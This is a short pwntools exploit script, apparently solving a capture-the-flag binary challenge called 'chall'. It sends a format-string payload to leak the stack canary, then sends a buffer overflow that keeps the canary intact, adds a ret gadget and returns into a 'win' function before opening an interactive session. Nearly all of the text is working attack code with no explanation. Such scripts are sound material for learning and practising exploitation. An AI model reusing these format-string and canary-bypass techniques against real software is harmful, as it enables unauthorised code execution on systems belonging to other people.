from pwn import *

elf = context.binary = ELF("./chall")

p = process()
pay = b'name DD%25$p'
p.sendlineafter(b'Choice: ',b'1')
p.sendline(pay)
p.sendlineafter(b'Choice: ',b'2')
p.recvuntil(b'DD')

canary = int(p.recvline().strip().decode(),16)
ret = 0x40101a
padd = b'a'*(0x90-8) 

pay = flat(
    padd,
    canary,
    b'a'*8,ret, 
    elf.sym.win
)

p.sendlineafter(b'Choice: ',b'1')
p.sendline(pay)
p.interactive()
